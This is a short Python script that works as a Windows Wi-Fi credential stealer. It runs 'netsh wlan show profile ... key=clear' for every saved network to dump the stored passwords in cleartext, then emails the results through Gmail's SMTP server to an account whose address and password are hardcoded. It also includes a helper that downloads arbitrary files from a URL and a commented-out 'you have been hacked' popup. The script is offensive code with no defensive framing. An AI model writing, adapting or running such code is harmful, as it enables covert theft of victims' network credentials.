import subprocess
import smtplib
import re
import os
import tempfile
import requests


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print('[+] Email sent.')
    except:
        print('[-] Error sending email.')


# command = 'msg * you have been hacked!'
# subprocess.Popen(command, shell=True)

result = ''
command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall('(?:Profile\s*:)(.*)', networks)
for network_name in network_names_list:
    command = 'netsh wlan show profile ' + network_name + ' key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result += current_result

send_mail('kaisersose099@gmail.com', '12345678Aa', result)
